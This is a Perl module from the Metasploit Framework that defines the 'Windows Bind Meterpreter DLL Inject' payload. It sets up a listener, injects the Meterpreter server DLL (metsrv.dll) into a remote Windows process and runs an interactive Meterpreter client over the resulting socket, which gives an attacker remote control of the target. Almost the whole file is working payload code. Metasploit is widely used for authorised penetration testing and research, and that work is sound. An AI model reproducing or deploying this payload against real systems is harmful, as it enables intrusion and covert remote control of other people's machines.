
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::win32_bind_meterpreter;
use strict;
use base 'Msf::PayloadComponent::Win32InjectLibStage';
use FindBin qw{$RealBin};
use Pex::Meterpreter::Client;

sub load {
  Msf::PayloadComponent::Win32InjectLibStage->import('Msf::PayloadComponent::Win32BindStager');
}

my $info =
{
  'Name'         => 'Windows Bind Meterpreter DLL Inject',
  'Version'      => '$Revision$',
  'Description'  => 'Listen for connection and inject the meterpreter server into the remote process',
  'Authors'      => [
                        'skape <mmiller [at] hick.org>',
                    ],
  'UserOpts'     => { 
                        'METDLL'  => [1, 'PATH', 'The full path the meterpreter server dll', "$RealBin/data/meterpreter/metsrv.dll"],
                    },
                
};

sub new 
{
	load();
	my $class = shift;
	my $hash = @_ ? shift : { };
	$hash = $class->MergeHashRec($hash, {'Info' => $info});
	my $self = $class->SUPER::new($hash, @_);
	return($self);
}

sub _InjectDLL 
{
	my $self = shift;

	return $self->GetVar('METDLL');
}

sub _InjectDLLName
{
	my $self = shift;

	return "metsrv.dll";
}


sub HandleConnection 
{
	my $self = shift;
	my $sock = $self->SocketOut;

	$self->SUPER::HandleConnection;
	sleep(1);

	# Start the meterpreter client
	my $client = Pex::Meterpreter::Client->new(
			consoleIn  => \*STDIN, # XXX
			consoleOut => \*STDOUT, # XXX
			socketIn   => $self->SocketIn,
			socketOut  => $self->SocketOut);

	# Did it succeed?
	if (not defined($client))
	{
		$self->PrintLine("[*] Could not create meterpreter client instance.");
		$self->KillChild();

		return;
	}

	# Run it.
	$client->run();

	$self->PrintLine("[*] Meterpreter client finished.");

	$sock->close();
	$self->KillChild();

	return;
}

1;
